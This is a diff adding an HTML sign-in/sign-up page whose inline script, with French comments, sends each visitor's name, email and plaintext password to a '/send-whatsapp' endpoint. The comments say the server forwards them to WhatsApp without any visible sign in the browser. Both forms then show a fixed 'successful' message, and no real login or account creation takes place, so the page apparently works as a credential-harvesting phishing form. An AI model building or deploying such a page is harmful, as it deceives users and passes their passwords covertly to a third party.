@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Sign In / Sign Up</title>
+
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <div class="auth-wrapper" id="authWrapper">
+
+        <!-- ==================== REGISTER ==================== -->
+
+        <div class="auth-form-box register-form-box">
+
+            <form id="registerForm">
+
+                <h1>Create Account</h1>
+
+                <div class="social-links">
+                    <a href="#" aria-label="Facebook">
+                        <i class="fab fa-facebook-f"></i>
+                    </a>
+
+                    <a href="#" aria-label="Google">
+                        <i class="fab fa-google"></i>
+                    </a>
+
+                    <a href="#" aria-label="LinkedIn">
+                        <i class="fab fa-linkedin-in"></i>
+                    </a>
+                </div>
+
+                <span>or use your email for registration</span>
+
+                <input type="text" id="registerName" placeholder="Full Name" required>
+                <input type="email" id="registerEmail" placeholder="Email Address" required>
+                <input type="password" id="registerPassword" placeholder="Password" required>
+
+                <button type="submit">
+                    Sign Up
+                </button>
+
+                <div class="mobile-switch">
+                    <p>Already have an account?</p>
+                    <button type="button" id="mobileLoginBtn">Sign In</button>
+                </div>
+
+            </form>
+
+        </div>
+
+
+        <!-- ==================== LOGIN ==================== -->
+
+        <div class="auth-form-box login-form-box">
+
+            <form id="loginForm">
+
+                <h1>Sign In</h1>
+
+                <div class="social-links">
+                    <a href="#" aria-label="Facebook">
+                        <i class="fab fa-facebook-f"></i>
+                    </a>
+
+                    <a href="#" aria-label="Google">
+                        <i class="fab fa-google"></i>
+                    </a>
+
+                    <a href="#" aria-label="LinkedIn">
+                        <i class="fab fa-linkedin-in"></i>
+                    </a>
+                </div>
+
+                <span>or use your account</span>
+
+                <input type="email" id="loginEmail" placeholder="Email Address" required>
+                <input type="password" id="loginPassword" placeholder="Password" required>
+
+                <a href="#">Forgot your password?</a>
+
+                <button type="submit">
+                    Sign In
+                </button>
+
+                <div class="mobile-switch">
+                    <p>Don't have an account?</p>
+                    <button type="button" id="mobileRegisterBtn">Sign Up</button>
+                </div>
+
+            </form>
+
+        </div>
+
+
+        <!-- ==================== SLIDE PANEL ==================== -->
+
+        <div class="slide-panel-wrapper">
+
+            <div class="slide-panel">
+
+                <div class="panel-content panel-content-left">
+                    <h1>Welcome Back!</h1>
+                    <p>Stay connected by logging in with your credentials and continue your experience.</p>
+                    <button type="button" class="transparent-btn" id="loginBtn">Sign In</button>
+                </div>
+
+                <div class="panel-content panel-content-right">
+                    <h1>Hey There!</h1>
+                    <p>Begin your amazing journey by creating an account with us today.</p>
+                    <button type="button" class="transparent-btn" id="registerBtn">Sign Up</button>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <!-- ==================== JAVASCRIPT ==================== -->
+
+    <script>
+
+        const authWrapper = document.getElementById("authWrapper");
+
+        const registerBtn = document.getElementById("registerBtn");
+        const loginBtn = document.getElementById("loginBtn");
+
+        const mobileRegisterBtn = document.getElementById("mobileRegisterBtn");
+        const mobileLoginBtn = document.getElementById("mobileLoginBtn");
+
+
+        registerBtn.addEventListener("click", () => {
+            authWrapper.classList.add("panel-active");
+        });
+
+        loginBtn.addEventListener("click", () => {
+            authWrapper.classList.remove("panel-active");
+        });
+
+        mobileRegisterBtn.addEventListener("click", () => {
+            authWrapper.classList.add("panel-active");
+        });
+
+        mobileLoginBtn.addEventListener("click", () => {
+            authWrapper.classList.remove("panel-active");
+        });
+
+
+        /* =========================
+           ENVOI AUTOMATIQUE VERS LE SERVEUR
+           (le serveur se charge d'envoyer sur WhatsApp,
+           aucune fenêtre ne s'ouvre côté navigateur)
+        ========================= */
+
+        async function envoyerWhatsApp({ name, email, password, type }) {
+
+            if ((type === "register" && (!name || !email || !password)) ||
+                (type === "login" && (!email || !password))) {
+                alert("Merci de remplir tous les champs d'abord.");
+                return;
+            }
+
+            try {
+
+                const response = await fetch("/send-whatsapp", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ name, email, password, type })
+                });
+
+                const data = await response.json();
+
+                if (!data.success) {
+                    console.error(data.error);
+                    alert("Erreur lors de l'envoi sur WhatsApp.");
+                }
+
+            } catch (err) {
+                console.error(err);
+                alert("Impossible de contacter le serveur. Vérifie qu'il est bien lancé (npm start).");
+            }
+
+        }
+
+
+        /* =========================
+           REGISTER FORM
+        ========================= */
+
+        document.getElementById("registerForm").addEventListener("submit", function (event) {
+
+            event.preventDefault();
+
+            const name = document.getElementById("registerName").value.trim();
+            const email = document.getElementById("registerEmail").value.trim();
+            const password = document.getElementById("registerPassword").value.trim();
+
+            envoyerWhatsApp({ name, email, password, type: "register" });
+
+            alert("Account created successfully!");
+
+        });
+
+
+        /* =========================
+           LOGIN FORM
+        ========================= */
+
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+
+            event.preventDefault();
+
+            const email = document.getElementById("loginEmail").value.trim();
+            const password = document.getElementById("loginPassword").value.trim();
+
+            envoyerWhatsApp({ email, password, type: "login" });
+
+            alert("Login successful!");
+
+        });
+
+    </script>
+
+</body>
+
+</html>
